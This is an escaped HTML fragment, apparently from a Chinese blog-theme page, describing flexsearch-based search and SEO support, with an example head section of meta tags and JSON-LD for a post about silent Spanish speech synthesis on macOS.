-&lt;h3 class="group " id="支持搜索功能"
->支持搜索功能&lt;a href="#%e6%94%af%e6%8c%81%e6%90%9c%e7%b4%a2%e5%8a%9f%e8%83%bd"
->&lt;i class="eva eva-link ml-3 align-middle text-theme opacity-0 transition ease-in-out group-hover:opacity-100">&lt;/i>&lt;/a
->&lt;/h3>
-&lt;p>把所有的内容都存到了 json 里面，然后使用 &lt;a
-class="link"
-href="https://github.com/nextapps-de/flexsearch"target="_blank" rel="noopener">flexsearch&lt;/a
->
-建立 key 来进行快速搜索&lt;/p>
-&lt;p>&lt;/p>
-&lt;h3 class="group " id="良好的-seo-优化"
->良好的 SEO 优化&lt;a href="#%e8%89%af%e5%a5%bd%e7%9a%84-seo-%e4%bc%98%e5%8c%96"
->&lt;i class="eva eva-link ml-3 align-middle text-theme opacity-0 transition ease-in-out group-hover:opacity-100">&lt;/i>&lt;/a
->&lt;/h3>
-&lt;p>虽然对于个人博客来说 SEO 可能没那么的重要，但还是写一下比较好，&lt;code>head&lt;/code> 部分把常用的 SEO 相关内容都写进去了，未来会支持 PWA 和 AMP&lt;/p>
-&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
-&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#ff79c6">meta&lt;/span> &lt;span style="color:#50fa7b">charset&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">utf-8&lt;/span>&amp;gt;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#ff79c6">title&lt;/span>&amp;gt;JS 西班牙语语音合成在 MacOS 上没有声音的问题&amp;lt;/&lt;span style="color:#ff79c6">title&lt;/span>&amp;gt;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#ff79c6">meta&lt;/span> &lt;span style="color:#50fa7b">name&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">viewport&lt;/span> &lt;span style="color:#50fa7b">content&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;width=device-width,initial-scale=1&amp;#34;&lt;/span>&amp;gt;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#ff79c6">meta&lt;/span> &lt;span style="color:#50fa7b">name&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">keywords&lt;/span> &lt;span style="color:#50fa7b">content&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;Ice-Hazymoon,冰凌胧月,Hazymoon,MikuTools,&amp;#34;&lt;/span>&amp;gt;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#ff79c6">meta&lt;/span> &lt;span style="color:#50fa7b">name&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">description&lt;/span> &lt;span style="color:#50fa7b">content&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;在上篇文章中提到的 写了个西班牙语学习工具 中，最近在 Mac 上使用时发现语音合成一直没有声音，研究了半天才找到解决方法。 在系统设置中打开【辅助功能】&amp;#34;&lt;/span>&amp;gt;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#ff79c6">meta&lt;/span> &lt;span style="color:#50fa7b">itemprop&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">description&lt;/span> &lt;span style="color:#50fa7b">content&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;在上篇文章中提到的 写了个西班牙语学习工具 中，最近在 Mac 上使用时发现语音合成一直没有声音，研究了半天才找到解决方法。 在系统设置中打开【辅助功能】&amp;#34;&lt;/span>&amp;gt;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#ff79c6">meta&lt;/span> &lt;span style="color:#50fa7b">http-equiv&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">x-ua-compatible&lt;/span> &lt;span style="color:#50fa7b">content&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;ie=edge&amp;#34;&lt;/span>&amp;gt;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#ff79c6">meta&lt;/span> &lt;span style="color:#50fa7b">itemprop&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">name&lt;/span> &lt;span style="color:#50fa7b">content&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;JS 西班牙语语音合成在 MacOS 上没有声音的问题&amp;#34;&lt;/span>&amp;gt;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#ff79c6">link&lt;/span> &lt;span style="color:#50fa7b">href&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">https://imiku.me/index.xml&lt;/span> &lt;span style="color:#50fa7b">title&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;JS 西班牙语语音合成在 MacOS 上没有声音的问题&amp;#34;&lt;/span> &lt;span style="color:#50fa7b">type&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">application/rss+xml&lt;/span> &lt;span style="color:#50fa7b">rel&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">alternate&lt;/span>&amp;gt;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#ff79c6">link&lt;/span> &lt;span style="color:#50fa7b">rel&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">stylesheet&lt;/span> &lt;span style="color:#50fa7b">href&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;https://cdn.jsdelivr.net/gh/Ice-Hazymoon/blog-hugo-pages@latest/main.css?v=1630320278&amp;#34;&lt;/span>&amp;gt;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#ff79c6">meta&lt;/span> &lt;span style="color:#50fa7b">property&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;og:site_name&amp;#34;&lt;/span> &lt;span style="color:#50fa7b">content&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;JS 西班牙语语音合成在 MacOS 上没有声音的问题&amp;#34;&lt;/span>&amp;gt;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#ff79c6">meta&lt;/span> &lt;span style="color:#50fa7b">property&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;og:type&amp;#34;&lt;/span> &lt;span style="color:#50fa7b">content&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;article&amp;#34;&lt;/span>&amp;gt;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#ff79c6">meta&lt;/span> &lt;span style="color:#50fa7b">property&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;og:title&amp;#34;&lt;/span> &lt;span style="color:#50fa7b">content&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;JS 西班牙语语音合成在 MacOS 上没有声音的问题&amp;#34;&lt;/span>&amp;gt;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#ff79c6">meta&lt;/span> &lt;span style="color:#50fa7b">property&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;og:description&amp;#34;&lt;/span> &lt;span style="color:#50fa7b">content&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;在上篇文章中提到的 写了个西班牙语学习工具 中，最近在 Mac 上使用时发现语音合成一直没有声音，研究了半天才找到解决方法。 在系统设置中打开【辅助功能】&amp;#34;&lt;/span>&amp;gt;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#ff79c6">meta&lt;/span> &lt;span style="color:#50fa7b">property&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;og:url&amp;#34;&lt;/span> &lt;span style="color:#50fa7b">content&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;https://imiku.me/2021/07/31/1459.html/&amp;#34;&lt;/span>&amp;gt;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#ff79c6">meta&lt;/span> &lt;span style="color:#50fa7b">property&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;og:image&amp;#34;&lt;/span> &lt;span style="color:#50fa7b">content&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;https://imiku.me/2021/07/31/1459.html/1630060151397491.jpg&amp;#34;&lt;/span>&amp;gt;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#ff79c6">meta&lt;/span> &lt;span style="color:#50fa7b">property&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;article:publisher&amp;#34;&lt;/span> &lt;span style="color:#50fa7b">content&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;https://imiku.me/2021/07/31/1459.html/&amp;#34;&lt;/span>&amp;gt;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#ff79c6">meta&lt;/span> &lt;span style="color:#50fa7b">name&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">twitter:card&lt;/span> &lt;span style="color:#50fa7b">content&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;summary_large_image&amp;#34;&lt;/span>&amp;gt;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#ff79c6">meta&lt;/span> &lt;span style="color:#50fa7b">name&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">twitter:title&lt;/span> &lt;span style="color:#50fa7b">content&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;JS 西班牙语语音合成在 MacOS 上没有声音的问题&amp;#34;&lt;/span>&amp;gt;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#ff79c6">meta&lt;/span> &lt;span style="color:#50fa7b">name&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">twitter:description&lt;/span> &lt;span style="color:#50fa7b">content&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;在上篇文章中提到的 写了个西班牙语学习工具 中，最近在 Mac 上使用时发现语音合成一直没有声音，研究了半天才找到解决方法。 在系统设置中打开【辅助功能】&amp;#34;&lt;/span>&amp;gt;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#ff79c6">meta&lt;/span> &lt;span style="color:#50fa7b">name&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">twitter:url&lt;/span> &lt;span style="color:#50fa7b">content&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;https://imiku.me/2021/07/31/1459.html/&amp;#34;&lt;/span>&amp;gt;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#ff79c6">meta&lt;/span> &lt;span style="color:#50fa7b">name&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">twitter:image&lt;/span> &lt;span style="color:#50fa7b">content&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;https://imiku.me/2021/07/31/1459.html/1630060151397491.jpg&amp;#34;&lt;/span>&amp;gt;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#ff79c6">meta&lt;/span> &lt;span style="color:#50fa7b">name&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">twitter:site&lt;/span> &lt;span style="color:#50fa7b">content&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;@Ice-Hazymoon&amp;#34;&lt;/span>&amp;gt;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#ff79c6">meta&lt;/span> &lt;span style="color:#50fa7b">property&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;og:image:width&amp;#34;&lt;/span> &lt;span style="color:#50fa7b">content&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;1920&amp;#34;&lt;/span>&amp;gt;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#ff79c6">meta&lt;/span> &lt;span style="color:#50fa7b">property&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;og:image:height&amp;#34;&lt;/span> &lt;span style="color:#50fa7b">content&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;1280&amp;#34;&lt;/span>&amp;gt;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#ff79c6">link&lt;/span> &lt;span style="color:#50fa7b">rel&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;shortcut icon&amp;#34;&lt;/span> &lt;span style="color:#50fa7b">href&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">/favicon.ico&lt;/span> &lt;span style="color:#50fa7b">type&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">image/x-icon&lt;/span>&amp;gt;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#ff79c6">script&lt;/span> &lt;span style="color:#50fa7b">type&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">application/ld+json&lt;/span>&amp;gt;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f1fa8c">&amp;#34;@context&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;http://schema.org&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f1fa8c">&amp;#34;@type&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;BlogPosting&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f1fa8c">&amp;#34;headline&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;JS 西班牙语语音合成在 MacOS上没有声音的问题&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f1fa8c">&amp;#34;mainEntityOfPage&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f1fa8c">&amp;#34;@type&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;WebPage&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f1fa8c">&amp;#34;@id&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;https:\/\/imiku.me\/2021\/07\/31\/1459.html\/&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f1fa8c">&amp;#34;image&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f1fa8c">&amp;#34;@type&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;ImageObject&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f1fa8c">&amp;#34;url&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;https:\/\/imiku.me\/cover.png&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f1fa8c">&amp;#34;width&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#bd93f9">1e3&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f1fa8c">&amp;#34;height&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#bd93f9">519&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f1fa8c">&amp;#34;genre&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;post&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f1fa8c">&amp;#34;keywords&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;MacOS,Safari,语音合成&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f1fa8c">&amp;#34;wordcount&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#bd93f9">171&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f1fa8c">&amp;#34;url&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;https:\/\/imiku.me\/2021\/07\/31\/1459.html\/&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f1fa8c">&amp;#34;datePublished&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;2021-07-31T13:27:27\u002b00:00&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f1fa8c">&amp;#34;dateModified&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;2021-07-31T13:27:27\u002b00:00&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f1fa8c">&amp;#34;author&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f1fa8c">&amp;#34;@type&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;Person&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f1fa8c">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;Ice-Hazymoon&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f1fa8c">&amp;#34;description&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/&lt;span style="color:#ff79c6">script&lt;/span>&amp;gt;
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
